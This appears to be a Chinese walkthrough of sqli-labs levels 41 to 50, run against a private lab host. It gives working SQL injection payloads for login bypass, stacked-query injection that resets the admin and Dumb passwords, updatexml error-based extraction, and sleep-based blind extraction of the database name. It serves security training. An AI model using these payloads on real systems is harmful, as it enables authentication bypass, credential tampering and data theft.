尝试布尔盲注

```
http://192.168.235.152/sqli-labs/Less-41?id=1 and 1=1 limit 0,1;--+
```

![image-20220924095457367](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220924095457367.png)

四十一关也使用的是堆叠注入，所以直接修改密码

```
http://192.168.235.152/sqli-labs/Less-41?id=1 and 1=1 limit 0,1;update users set password=123 where id=1--+
```

![image-20220924095751326](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220924095751326.png)

## 第四十二关

```
login_user=admin
&login_password='or(1=1)-- 
&mysubmit=Login
```

![image-20220924100621553](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220924100621553.png)

```
login_user=admin&login_password=';update users set password=1234 where username='admin'-- &mysubmit=Login
```

尝试使用密码1234进行登录

![image-20220924102443733](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220924102443733.png)

## 第四十三关

```
login_user=admin
&login_password=aa') or 1=1-- '
&mysubmit=Login
```

登录成功

![image-20220924103009504](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220924103009504.png)

```
login_user=admin
&login_password=aa') or 1=2;update users set password=987 where username='admin'-- '
&mysubmit=Login
```

尝试使用密码987进行登录

![image-20220924103230039](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220924103230039.png)

## 第四十四关

尝试

```
login_user=admin
&login_password='or 1=1-- 
&mysubmit=Login
```

![image-20220924103600824](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220924103600824.png)

```
login_user=admin
&login_password='or 1=2;update users set password='qwe' where username='admin'-- 
&mysubmit=Login
```

尝试使用密码qwe进行登录

![image-20220924103719327](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220924103719327.png)

## 第四十五关

尝试

```
login_user=admin
&login_password=')or(1=1)-- 
&mysubmit=Login
```

登录成功

![image-20220924104242522](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220924104242522.png)

尝试注入

```
login_user=admin
&login_password=')or(1=2);update users set password='123' where username='admin'-- 
&mysubmit=Login
```

尝试使用密码123进行登录

![image-20220924104435991](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220924104435991.png)

## 第四十六关

```
http://192.168.235.152/sqli-labs/Less-46?sort=4
```

报order by的行数错误，也就是说sort是order by的一个参数

![image-20220924104939537](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220924104939537.png)

```
http://192.168.235.152/sqli-labs/Less-46?sort=3,2 and(updatexml(1,concat(0x7e,database(),0x7e),1))-- 
```

![image-20220924105254995](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220924105254995.png)

## 第四十七关

尝试输入一个报错值，发现网页正常显示

![image-20220924105742972](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220924105742972.png)

加上'发现报错

![image-20220924105830595](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220924105830595.png)

可以推断1被'号包裹，然后尝试注入

```
http://192.168.235.152/sqli-labs/Less-47?sort='and(updatexml(1,concat(0x7e,database(),0x7e),1))--+
```

![image-20220924110521784](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220924110521784.png)

## 第四十八关

使用时间盲注

获取数据库长度

```
http://192.168.235.152/sqli-labs/Less-48?sort=2%20and(if(length(database())=8,sleep(0.1),1))-- 
```

![image-20220924111456790](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220924111456790.png)

获取数据库名称

```
http://192.168.235.152/sqli-labs/Less-48?sort=2%20and(if(substr(database(),1,1)='s',sleep(0.1),1))-- 
```

![image-20220924111611638](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220924111611638.png)

## 第四十九关

时间型盲注

获取数据库长度

```
http://192.168.235.152/sqli-labs/Less-49?sort=1'and(if(length(database())=8,sleep(0.1),1))%23
```

获取数据库名称

```
http://192.168.235.152/sqli-labs/Less-49?sort=1'and(if(substr(database(),1,1)='s',sleep(0.1),1))%23
```

## 第五十关

堆叠注入，尝试修改Dumb的密码

![image-20220924113645230](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220924113645230.png)

payload

```
http://192.168.235.152/sqli-labs/Less-50?sort=1;update users set password='123' where username='Dumb'
```

![image-20220924113752410](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20220924113752410.png)
